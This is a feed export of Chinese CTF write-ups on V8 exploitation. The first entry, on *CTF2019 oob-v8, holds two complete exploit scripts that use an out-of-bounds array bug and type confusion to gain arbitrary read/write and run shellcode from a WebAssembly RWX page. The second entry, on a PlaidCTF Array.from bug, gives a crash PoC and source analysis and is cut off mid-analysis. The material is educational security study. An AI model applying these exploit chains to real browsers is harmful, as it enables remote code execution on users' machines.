        <tag>JIT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[*CTF2019 OOB-v8 writeup]]></title>
    <url>%2Fpost%2F825d66e8.html</url>
    <content type="text"><![CDATA[这是用来入门v8的一道很好的CTF题目，主要思路就是利用oob修改v8中JS对象的map，从而造成type confusion调试环境具体环境搭建步骤就不详述了，patch文件在这里下载12345git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598gclient syncgit apply ../oob.diff./tools/dev/v8gen.py x64.releaseninja -c ./out.gn/x64.release漏洞分析该题是出题人通过patch，在v8中添加了一个漏洞。所以先从diff文件入手12345678910111213141516171819202122232425262728293031323334353637383940414243diff --git a/src/bootstrapper.cc b/src/bootstrapper.ccindex b027d36..ef1002f 100644--- a/src/bootstrapper.cc+++ b/src/bootstrapper.cc@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object, Builtins::kArrayPrototypeCopyWithin, 2, false); SimpleInstallFunction(isolate_, proto, "fill", Builtins::kArrayPrototypeFill, 1, false);+ SimpleInstallFunction(isolate_, proto, "oob",+ Builtins::kArrayOob,2,false); SimpleInstallFunction(isolate_, proto, "find", Builtins::kArrayPrototypeFind, 1, false); SimpleInstallFunction(isolate_, proto, "findIndex",diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.ccindex 8df340e..9b828ab 100644--- a/src/builtins/builtins-array.cc+++ b/src/builtins/builtins-array.cc@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate, return *final_length; &#125; &#125; // namespace+BUILTIN(ArrayOob)&#123;+ uint32_t len = args.length();+ if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();+ Handle&lt;JSReceiver&gt; receiver;+ ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+ isolate, receiver, Object::ToObject(isolate, args.receiver()));+ Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver); // 获取Array+ FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements()); //获取数组元素+ uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number()); //获取数组长度+ if(len == 1)&#123;+ //read+ return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));+ &#125;else&#123;+ //write+ Handle&lt;Object&gt; value;+ ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+ isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+ elements.set(length,value-&gt;Number());+ return ReadOnlyRoots(isolate).undefined_value();+ &#125;+&#125;...从diff文件中可以看出，出题人为一个Array对象添加了一个oob函数，具体实现在ArrayOob。接下来开始分析oob函数。首先获取了参数的个数len，若个数大于2，则返回undefined若参数个数为1，则返回下标为length的数组元素，显然这里造成了一个越界读取，访问到了数组后面的一个元素。即read arr[length]若参数个数为2，则将第二个参数值写入下标为length的元素，造成了越界写入。即 arr[length] = arg这里需要注意一点，在函数调用时，第一个参数始终为this指针，我们所提供的参数则是从第二个开始的。漏洞利用利用技巧内存布局因为我们拥有一个越界访问一个元素的能力，那么这里我们需要搞清楚在Array element的后方是什么。我们首先进行如下调试123456789101112131415161718192021222324252627282930313233343536373839404142434445464748d8&gt; var arr = [1.1, 2.2, 3.3]d8&gt; %DebugPrint(arr)DebugPrint: 0x831db04dd99: [JSArray] - map: 0x2b36a3c82ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties] - prototype: 0x251f23191111 &lt;JSArray[0]&gt; - elements: 0x0831db04dd71 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS] - length: 3 - properties: 0x25361adc0c71 &lt;FixedArray[0]&gt; &#123; #length: 0x3860ab3401a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x0831db04dd71 &lt;FixedDoubleArray[3]&gt; &#123; 0: 1.1 1: 2.2 2: 3.3 &#125;0x2b36a3c82ed9: [Map] - type: JS_ARRAY_TYPE - instance size: 32 - inobject properties: 0 - elements kind: PACKED_DOUBLE_ELEMENTS - unused property fields: 0 - enum length: invalid - back pointer: 0x2b36a3c82e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; - prototype_validity cell: 0x3860ab340609 &lt;Cell value= 1&gt; - instance descriptors #1: 0x251f23191f49 &lt;DescriptorArray[1]&gt; - layout descriptor: (nil) - transitions #1: 0x251f23191eb9 &lt;TransitionArray[4]&gt;Transition array #1: 0x25361adc4ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x2b36a3c82f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt; - prototype: 0x251f23191111 &lt;JSArray[0]&gt; - constructor: 0x251f23190ec1 &lt;JSFunction Array (sfi = 0x3860ab34aca1)&gt; - dependent code: 0x25361adc02c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0pwndbg&gt; x/12gx 0x831db04dd99-1 // JSArray0x831db04dd98: 0x00002b36a3c82ed9 0x000025361adc0c71 // Map Properties0x831db04dda8: 0x00000831db04dd71 0x0000000300000000 // Elements Length0x831db04ddb8: 0x000025361adc0941 0x00000adc7d4370820x831db04ddc8: 0x6974636e7566280a 0x220a7b2029286e6f0x831db04ddd8: 0x6972747320657375 0x2f2f0a0a3b2274630x831db04dde8: 0x2065726f6d204120 0x6173726576696e75pwndbg&gt; x/12gx 0x831db04dd71-1 // Elements0x831db04dd70: 0x000025361adc14f9 0x0000000300000000 // Map Length0x831db04dd80: 0x3ff199999999999a 0x400199999999999a // 1.1 2.20x831db04dd90: 0x400a666666666666 0x00002b36a3c82ed9 // 3.30x831db04dda0: 0x000025361adc0c71 0x00000831db04dd710x831db04ddb0: 0x0000000300000000 0x000025361adc09410x831db04ddc0: 0x00000adc7d437082 0x6974636e7566280a从地址很容易可以看出，在Elements的后面紧跟的就是JSArray对象的Map，布局如下图1234567891011121314151617181920212223Elements---&gt;+-------------+ | MAP +&lt;------+ +-------------+ | | Length | | +-------------+ | | element#1 | | +-------------+ | | element#2 | | +-------------+ | | ... | | +-------------+ | | element#N | | JSArray---&gt;--------------+ | | MAP | | +-------------+ | | Properties | | +-------------+ | | Elements +-------+ +-------------+ | Length | +-------------+ | ... | +-------------+这意味着我们可以通过越界访问获取到Array对象的Map地址，同时还可以修改该地址。trick：在调试过程中会发现，Elements并不是始终紧邻JSArray的，有些时候两者会相距一段距离。在师傅们的wp中提到可以使用splice来使该布局稳定，例如1var arr = [1.1, 2.2, 3.3].splice(0);具体原理我没有查到相关资料。。可能只有等以后读了源码才知道吧类型混淆123456789101112131415d8&gt; a = [1.1, 2.2, 3.3]d8&gt; %DebugPrint(a)DebugPrint: 0x35fa7c80dd91: [JSArray] - map: 0x1ce6487c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties] - prototype: 0x1c3276151111 &lt;JSArray[0]&gt; - elements: 0x35fa7c80dd69 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]...d8&gt; b = [&#123;&#125;, 2.2]d8&gt; %DebugPrint(b)DebugPrint: 0x35fa7c810531: [JSArray] - map: 0x1ce6487c2f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties] - prototype: 0x1c3276151111 &lt;JSArray[0]&gt; - elements: 0x35fa7c8104d9 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]...在v8中，Map描述了一个对象的结构，它决定了如何解析对象中的数据。从以上调试信息中即可以看到a为Map(PACKED_DOUBLE_ELEMENTS)，而b为Map(PACKED_ELEMENTS)所以，若将一个存放对象的数组的Map修改为一个浮点型数组的Map，再次去读取该数组中的元素时，将会把其中的对象（指针）当做浮点型数据读取出来，这类操作就叫做类型混淆（type confusion）在此题中，我们可以任意修改和读取JSArray对象的Map，则可以很容易的造成类型混淆。wasm在v8利用中总是需要布置shellcode，那么在内存中找到一块具有RWX权限的区域将会十分有帮助。wasm(WebAssembly)详细概念就不在这介绍了，这里值得注意的是是用wasm可以在内存中开辟出一块RWX的内存空间。这里可以将C语言编写的代码转换为wasm格式。当然，编写的c语言代码不能够调用库函数（不然就可以直接写rce了），但是只要通过漏洞，将我们的shellcode覆盖到内存中wasm代码所在rwx区域即可。下文将展示如何定位到rwx内存区域12345678910111213141516171819202122232425262728293031323334353637383940414243444546//test.jsconst wasm_code = new Uint8Array([ 0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x00, 0x0b ]); const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));const wasm_func = wasm_instance.exports.a;%DebugPrint(wasm_instance);readline();----------------------------------------------------------------------------------pwndbg&gt; r --allow-natives-syntax ../../exps/OOB/test.jsDebugPrint: 0x3ac2ec75f721: [WasmInstanceObject] in OldSpace - map: 0x3e31257c9789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x0c416a70ac19 &lt;Object map = 0x3e31257cabd9&gt; - elements: 0x018f99940c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - module_object: 0x0c416a70e421 &lt;Module map = 0x3e31257c91e9&gt;...pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x18f99940000 0x18f99980000 r--p 40000 0 0x2d98eee0000 0x2d98eee1000 rwxp 1000 0 &lt;---RWX area 0x2d98eee1000 0x2d9ceee0000 ---p 3ffff000 0 0xc416a700000 0xc416a740000 rw-p 40000 0 0x13f152180000 0x13f1521c0000 rw-p 40000 0 ... pwndbg&gt; x/32gx 0x3ac2ec75f721-10x3ac2ec75f720: 0x00003e31257c9789 0x0000018f99940c710x3ac2ec75f730: 0x0000018f99940c71 0x00000000000000000x3ac2ec75f740: 0x0000000000000000 0x00000000000000000x3ac2ec75f750: 0x000055eaa54b90a0 0x0000018f99940c710x3ac2ec75f760: 0x000055eaa55474f0 0x0000018f999404d10x3ac2ec75f770: 0x0000000000000000 0x00000000000000000x3ac2ec75f780: 0x0000000000000000 0x00000000000000000x3ac2ec75f790: 0x000055eaa5547510 0x0000018f999404d10x3ac2ec75f7a0: 0x000055eaa54af3c0 0x000002d98eee0000 &lt;---RWX area0x3ac2ec75f7b0: 0x00000c416a70e421 0x00000c416a70e5d9...即instance+0x88处即存放了RWX区域的地址利用流程（方法一）创建一个数组fake_ab，在element中伪造一个ArrayBuffer创建一个double数组和一个object数组，将fake_ab放入object数组中分别泄露出double map和object map使用double map覆盖object数组的Map，使object数组将其元素当做小数来解析从object中读取出fake_ab的地址，通过固定的偏移（使用splice()）计算出elements的地址（即伪造的ArrayBuffer）将elements地址写入objects数组中，并还原objects数组的Map重新将elements取出来，这时将会将其作为一个ArrayBuffer因为elements可以通过fake_ab随意修改，所以我们可以通过控制backingStore来实现任意读写了。关于伪造ArrayBuffer在伪造ArrayBuffer的时候需要同时也伪造出它的Map，这部分可以通过调试一个真正的ArrayBuffer并将其Map复制下来（这里并不需要全部的数据）。关于Map的内存模型可以参考这里。1234567891011121314151617181920212223var fake_arraybuffer = [ //map|properties mem.u2d(0x0),mem.u2d(0x0), //elements|length mem.u2d(0x0),mem.u2d(0x1000), //backingstore|0x2 mem.u2d(0x0),mem.u2d(0x2), //padding mem.u2d(0x0),mem.u2d(0x0), //fake map mem.u2d(0x0),mem.u2d(0x1900042319080808), mem.u2d(0x00000000082003ff),mem.u2d(0x0), mem.u2d(0x0),mem.u2d(0x0), mem.u2d(0x0),mem.u2d(0x0)].splice(0);-------------------------------------------------------------------------pwndbg&gt; x/12gx 0x214d3d2421b9-1 &lt;-- ArrayBuffer(0x1000)的Map0x214d3d2421b8: 0x00003255d5d40189 0x19000423190808080x214d3d2421c8: 0x00000000082003ff 0x000015f53700e9810x214d3d2421d8: 0x000015f53700e7e9 0x0000000000000000...EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899class Memory&#123; constructor()&#123; this.buf = new ArrayBuffer(8); this.f64 = new Float64Array(this.buf); this.u32 = new Uint32Array(this.buf); this.bytes = new Uint8Array(this.buf); &#125; d2u(val)&#123; this.f64[0] = val; let tmp = Array.from(this.u32); return tmp[1] * 0x100000000 + tmp[0]; &#125; u2d(val)&#123; let tmp = []; tmp[0] = parseInt(val % 0x100000000); tmp[1] = parseInt((val - tmp[0]) / 0x100000000); this.u32.set(tmp); return this.f64[0]; &#125;&#125;var mem = new Memory();var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];const wasm_code = new Uint8Array([ 0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x00, 0x0b ]);const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));const wasm_func = wasm_instance.exports.a;var fake_arraybuffer = [ //map|properties mem.u2d(0x0), mem.u2d(0x0), //elements|length mem.u2d(0x0), mem.u2d(0x1000), //backingstore|0x2 mem.u2d(0x0), mem.u2d(0x2), //padding mem.u2d(0x0), mem.u2d(0x0), //fake map mem.u2d(0x0), mem.u2d(0x1900042319080808), mem.u2d(0x00000000082003ff), mem.u2d(0x0), mem.u2d(0x0), mem.u2d(0x0), mem.u2d(0x0), mem.u2d(0x0)].splice(0);var ab = new ArrayBuffer(0x1000).splice(0);var obj = [wasm_instance, fake_arraybuffer, ab].splice(0);var buf = [1.1, 2.2, 3.3].splice(0);obj_map = mem.d2u(obj.oob()); //读取mapbuf_map = mem.d2u(buf.oob());console.log("obj_map addr: 0x" + obj_map.toString(16))console.log("buf_map addr: 0x" + buf_map.toString(16))obj.oob(mem.u2d(buf_map)); //将obj数组的map改为double mapwasm_inst_addr = mem.d2u(obj[0]) - 1; //读取wasm_instance的地址rwx_area_addr = wasm_inst_addr + 0x88 //获取rwx地址的存放地址fake_ab_addr = mem.d2u(obj[1]) - 1; //读取fake_arraybuffer的地址fake_obj_addr = fake_ab_addr - 0x80; //获取fake_arraybuffer的elements的地址fake_obj_map = fake_ab_addr - 0x40; //获取伪造的map地址console.log("fake_ab_addr: 0x" + fake_ab_addr.toString(16));console.log("rwx_area_addr: 0x" + rwx_area_addr.toString(16));fake_arraybuffer[0] = mem.u2d(fake_obj_map + 1); //将伪造的map填入fake_arraybuffer[4] = mem.u2d(rwx_area_addr); //将rwx地址的存放地址填入backingStoreobj[2] = mem.u2d(fake_obj_addr + 1); //将elements地址写入obj数组obj.oob(mem.u2d(obj_map)); //恢复obj数组的mapfake_obj = new DataView(obj[2]); //将伪造的ArrayBuffer取出rwx_area = mem.d2u(fake_obj.getFloat64(0, true));console.log("rwx_area: 0x" + rwx_area.toString(16)); //读取rwx空间的地址fake_arraybuffer[4] = mem.u2d(rwx_area);for (i = 0; i &lt; shellcode.length; i++)&#123; fake_obj.setUint32(i * 4, shellcode[i], true);&#125;wasm_func();利用流程（方法二）和前面一个差不多，这里不需要伪造ArrayBuffer和它的map，只需要伪造一个JSArray即可，因为通过修改elements指针也可以实现任意读写。但是有个问题是，在访问某地址时，需要将elements指针置于该地址-0x10处，因为rwx空间是独立的一块内存页，在其-0x10处的地址是非法的，所以最后还是通过修改ArrayBuffer的backingStore来布置shellcode。EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102class Memory&#123; constructor()&#123; this.buf = new ArrayBuffer(8); this.f64 = new Float64Array(this.buf); this.u32 = new Uint32Array(this.buf); this.bytes = new Uint8Array(this.buf); &#125; d2u(val)&#123; this.f64[0] = val; let tmp = Array.from(this.u32); return tmp[1] * 0x100000000 + tmp[0]; &#125; u2d(val)&#123; let tmp = []; tmp[0] = parseInt(val % 0x100000000); tmp[1] = parseInt((val - tmp[0]) / 0x100000000); this.u32.set(tmp); return this.f64[0]; &#125;&#125;var mem = new Memory();var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];const wasm_code = new Uint8Array([ 0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x00, 0x0b ]);const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));const wasm_func = wasm_instance.exports.a;var fake_array = [ //map|properties mem.u2d(0x0), mem.u2d(0x0), //elements|length mem.u2d(0x0), mem.u2d(0x100000000000), //backingstore|0x2 mem.u2d(0x0), mem.u2d(0x2),].splice(0);var obj = [wasm_instance, fake_array, 1.1].splice(0);var buf = [1.1, 2.2, 3.3].splice(0);obj_map = mem.d2u(obj.oob());buf_map = mem.d2u(buf.oob());console.log("obj_map addr: 0x" + obj_map.toString(16))console.log("buf_map addr: 0x" + buf_map.toString(16))obj.oob(mem.u2d(buf_map));wasm_inst_addr = mem.d2u(obj[0]) - 1;rwx_area_addr = wasm_inst_addr + 0x88fake_array_addr = mem.d2u(obj[1]) - 1;fake_obj_addr = fake_array_addr - 0x30;console.log("fake_obj_addr: 0x" + fake_obj_addr.toString(16));console.log("rwx_area_addr: 0x" + rwx_area_addr.toString(16));fake_array[0] = mem.u2d(buf_map);obj[2] = mem.u2d(fake_obj_addr + 1);obj.oob(mem.u2d(obj_map));fake_obj = obj[2];function arb_read(addr)&#123; fake_array[2] = mem.u2d(addr - 0x10 + 1); return mem.d2u(fake_obj[0]);&#125;function arb_write(addr, value)&#123; fake_array[2] = mem.u2d(addr - 0x10 + 1); fake_obj[0] = mem.u2d(value);&#125;rwx_area = arb_read(rwx_area_addr);console.log("rwx_area: 0x" + rwx_area.toString(16));ab = new ArrayBuffer(0x100);obj[2] = ab;obj.oob(mem.u2d(buf_map));ab_addr = mem.d2u(obj[2]) - 1;ab_backStore = ab_addr + 0x20;arb_write(ab_backStore, rwx_area);ab_view = new DataView(ab);for(i = 0; i &lt; shellcode.length; i++)&#123; ab_view.setUint32(i * 4, shellcode[i], true);&#125;wasm_func()参考资料从一道CTF题零基础学V8漏洞利用Chrome v8 exploit - OOBstar ctf chrome oob writeupstarctf 2019 - OOB by vngkv123StarCTF OOB writeup by p1umer*CTF 2019 oob-v8 by Ne0]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>OOB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[v8 exploit入门[PlaidCTF roll a d8]]]></title>
    <url>%2Fpost%2Fabaa2e35.html</url>
    <content type="text"><![CDATA[本文首发于先知社区 https://xz.aliyun.com/t/5190这篇博客3月份一直拖到现在才写完2333，太水了一直想要入门chrome漏洞挖掘，于是就打算从一道CTF题目入手（其实也是一个真实的漏洞），这篇文章记录了我的学习过程，是一个总结，也希望能帮到同样在入门的朋友。调试环境Ubuntu16.04 x64pwndbgv8调试环境搭建这里主要参考了sakura师傅的教程http://eternalsakura13.com/2018/05/06/v8/以及最重要的一点，挂代理，这里我使用的是polipohttp://couplee.wang/wnagzihxa1n/BrowserSecurity/Ubuntu_16.04_x64%E7%BC%96%E8%AF%91V8%E6%BA%90%E7%A0%81/article.html编译首先进入题目所给出的链接，找到修复bug的commit。然后可以找到包含漏洞的版本hash值和一个poc文件然后通过parent的hash值回退到漏洞版本，并进行编译（debug模式）1234git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599gclient synctools/dev/v8gen.py x64.debug ninja -C out.gn/x64.debug d8relase模式编译12tools/dev/v8gen.py x64.releaseninja -C out.gn/x64.release d8分析与调试技巧这里先简单介绍一下我学习过程中用到的调试方法。%DebugPrint()这是一个极其常用的函数，可以通过该函数打印出对象的详细信息，如内存地址、属性、map等。运行时使用参数--allow-natives-syntax如：12let arr = [];%DebugPrint(arr);1./d8 --allow-natives-syntax ./test.jsDebugBreak()当分析v8源码时，遇到CodeStubAssembler编写的代码，可以在其中插入DebugBreak();，这相当于插入了一个断点(类似int 3)，重新编译后使用调试器调试时，可以在插入处断下。Print()同样，遇到CodeStubAssembler编写的代码时，可以使用它来输出一些变量值，函数原型是1void CodeStubAssembler::Print(const char* prefix, Node* tagged_value)用法12//第二个参数是Node*型，可能需要强转Print("array", static_cast&lt;Node*&gt;(array.value()));重新编译后即可。readline()可以添加在js代码中，让程序停下来等待输入，方便使用gdb断下进行调试。该方法比写一个while死循环好在，让程序停下后，还可以让程序继续运行下去。V8自带gdb调试命令在/tools/目录下，可以找到gdbinit和gdb-v8-support.py。我将gdb-v8-support.py复制到了根目录下，然后修改自己的.gdbinit文件，将提供的gdbinit都复制过来。就可以在gdb中使用v8自带调试命令了具体命令可以在gdbinit中自己查阅，注释还是很友好的。我最常用的就是job。polyfill因为我没有系统学过js开发，不是太清楚ployfill在实际开发时的作用（似乎是用来补充一些浏览器缺少的api）。但是在学习v8的过程中对我有极大的帮助，在ployfill中使用js自身实现了许多js的原生函数，这意味着，在调试js原生函数的时候可以通过查看polyfill来了解函数实现细节。而且经过和v8中使用CodeStubAssembler实现的原生函数，可以发现实现逻辑基本一致。漏洞分析POC分析1234567891011121314151617let oobArray = [];let maxSize = 1028 * 8;Array.from.call(function() &#123; return oobArray &#125;, &#123;[Symbol.iterator] : _ =&gt; ( &#123; counter : 0, next() &#123; let result = this.counter++; if (this.counter &gt; maxSize) &#123; oobArray.length = 0; return &#123;done: true&#125;; &#125; else &#123; return &#123;value: result, done: false&#125;; &#125; &#125; &#125;) &#125;);oobArray[oobArray.length - 1] = 0x41414141;运行该poc，触发crash（注意使用debug编译的d8）简单的分析该poc首先创建了一个数组oobArray然后将function() { return oobArray }作为this参数传入Array.from.call。此处，我查阅了pollyfill中对Array.from的实现（这里对Array.from的分析其实是在下文分析漏洞时进行的，但为了描述的方便，先写在此处）因为这里Array.from.call的this参数是一个函数，所以会调用var a = new c()查询javascript中new关键字的返回值可知，当使用new关键字调用一个函数时，若函数返回一个非原始变量（如像object、array或function），那么这些返回值将取代原本应该返回的this实例。这意味着这里调用c()会返回oobArray，并且此后的操作都将直接修改oobArray。回到poc中，在iterator中可以看到，在最后一次迭代时，将oobArray的长度修改为0。最后的赋值语句触发crash通过poc可以猜测，可能是最后一次迭代时对oobArray.length的赋值时出现了bug, 导致最后oobArray实际长度与length的值的不同，造成越界访问。下面进行详细的分析。源码分析首先从diff入手，看看如何修复的该漏洞注意到这里只修改了GenerateSetLength函数中的一个跳转语句，将LessThan修改为NotEqual，这说明极有可能是在length_smi &gt; old_length时的处理出现了问题。但仍需进一步分析。CodeStubAssembler简介这里分析将涉及到CodeStubAssembler代码，这里先简单介绍一下。v8为了提高效率，采用了CodeStubAssembler来编写js的原生函数，它是是一个定制的，与平台无关的汇编程序，它提供低级原语作为汇编的精简抽象，但也提供了一个扩展的高级功能库。这里我简单记录其中几个的语法，一些是我自己推测理解的，仅供参考。。TF_BUILTIN：创建一个函数Label：用于定义将要用到的标签名，这些标签名将作为跳转的目标BIND：用于绑定一个标签，作为跳转的目标Branch：条件跳转指令VARIABLE：定义一些变量Goto：跳转漏洞代码逻辑建议使用IDE之类来查看代码，方便搜索和跳转。首先查看GenerateSetLength函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array, TNode&lt;Number&gt; length) &#123; Label fast(this), runtime(this), done(this); // Only set the length in this stub if // 1) the array has fast elements, // 2) the length is writable, // 3) the new length is greater than or equal to the old length. // 1) Check that the array has fast elements. // TODO(delphick): Consider changing this since it does an an unnecessary // check for SMIs. // TODO(delphick): Also we could hoist this to after the array construction // and copy the args into array in the same way as the Array constructor. BranchIfFastJSArray(array, context, &amp;fast, &amp;runtime); BIND(&amp;fast); &#123; TNode&lt;JSArray&gt; fast_array = CAST(array); TNode&lt;Smi&gt; length_smi = CAST(length); TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array); CSA_ASSERT(this, TaggedIsPositiveSmi(old_length)); EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime); // 3) If the created array already has a length greater than required, // then use the runtime to set the property as that will insert holes // into the excess elements and/or shrink the backing store. GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime); StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi); Goto(&amp;done); &#125; BIND(&amp;runtime); &#123; CallRuntime(Runtime::kSetProperty, context, static_cast&lt;Node*&gt;(array), CodeStubAssembler::LengthStringConstant(), length, SmiConstant(LanguageMode::kStrict)); Goto(&amp;done); &#125; BIND(&amp;done); &#125;&#125;;首先判断是否具有fast element，这里poc代码执行时会进入&amp;fast分支随后若length_smi &lt; old_length，就跳转到&amp;runtime，否则执行StoreObjectFieldNoWriteBarrier根据源码注释可以知道，&amp;runtime会进行内存的缩减而分析StoreObjectFieldNoWriteBarrier函数，这应该是一个赋值函数，将array的length属性值修改为length_smi前面我们猜测是length_smi &gt; old_length时出现问题，通过这里的分析，漏洞根源似乎更明了了。当length_smi &gt; old_length，程序不会执行&amp;runtime去进行缩减内存等操作，而是会直接修改length的值。那么可以猜测是将较大的length_smi写入了数组的length，导致数组的长度属性值大于了实际长度，造成了越界访问。看到这里，感觉仍然没有完全分析透彻，不知道函数各个参数的具体来源都是什么，也不知道为什么length_smi会大于old_length。于是尝试寻找调用该函数的上层函数，搜索后定位到了TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)，代码比较长，不过还是得慢慢看。(之所以确定这个函数，是因为poc中确实正好调用了Array.from)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071// ES #sec-array.fromTF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123; ... TNode&lt;JSReceiver&gt; array_like = ToObject(context, items); TVARIABLE(Object, array); TVARIABLE(Number, length); // Determine whether items[Symbol.iterator] is defined: IteratorBuiltinsAssembler iterator_assembler(state()); Node* iterator_method = iterator_assembler.GetIteratorMethod(context, array_like); Branch(IsNullOrUndefined(iterator_method), &amp;not_iterable, &amp;iterable); // 如果可以迭代 BIND(&amp;iterable); &#123; ... // 返回一个数组，用于存储迭代后得到的结果 // Construct the output array with empty length. array = ConstructArrayLike(context, args.GetReceiver()); ... Goto(&amp;loop); //开始迭代 BIND(&amp;loop); &#123; // 判断迭代是否结束 // Loop while iterator is not done. TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep( context, iterator_record, &amp;loop_done, fast_iterator_result_map)); TVARIABLE(Object, value, CAST(iterator_assembler.IteratorValue( context, next, fast_iterator_result_map))); ... // 将得到的结果存入array // Store the result in the output object (catching any exceptions so the // iterator can be closed). Node* define_status = CallRuntime(Runtime::kCreateDataProperty, context, array.value(), index.value(), value.value()); GotoIfException(define_status, &amp;on_exception, &amp;var_exception); // 索引加1 index = NumberInc(index.value()); ... Goto(&amp;loop); &#125; //迭代结束 BIND(&amp;loop_done); &#123; //将迭代次数赋值给length变量 length = index; Goto(&amp;finished); &#125; ... &#125; ... BIND(&amp;finished); // 调用GenerateSetLength，将array和迭代次数作为参数 // Finally set the length on the output and return it. GenerateSetLength(context, array.value(), length.value()); 